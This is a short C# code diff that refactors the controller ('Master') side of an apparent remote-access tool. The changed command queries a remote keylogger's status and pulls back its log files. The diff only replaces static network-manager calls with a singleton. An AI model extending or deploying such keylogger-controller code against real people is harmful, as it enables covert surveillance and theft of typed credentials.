@@ -3,6 +3,7 @@ using Master.Commands.Core;
 using System;
 using System.Collections.Generic;
 using System.IO;
+using Master.Core;
 using Shared;
 
 namespace Master.Commands
@@ -32,7 +33,7 @@ namespace Master.Commands
             else
             {
                 Console.Write("Keylogger status : [");
-                if (MasterCommandsManager.networkManager.ReadLine() == "on")
+                if (MasterNetworkManager.GetInstance().ReadLine() == "on")
                     ColorTools.WriteSuccess("ON", true);
                 else
                     ColorTools.WriteError("OFF", true);
@@ -46,7 +47,7 @@ namespace Master.Commands
 
             while (true)
             {
-                var data = GlobalCommandsManager.networkManager.ReadLine();
+                var data = MasterNetworkManager.GetInstance().ReadLine();
                 if (data == "{end}")
                 {
                     if(first) ColorTools.WriteCommandMessage("No logs");
@@ -55,7 +56,7 @@ namespace Master.Commands
                 try
                 {
                     var remoteFile = data;
-                    data = GlobalCommandsManager.networkManager.ReadLine();
+                    data = MasterNetworkManager.GetInstance().ReadLine();
                     if (data.Length >= 2 && data.Substring(0, 2) == "KO")
                     {
                         ColorTools.WriteCommandError($"Couldn't get file '{remoteFile}'");
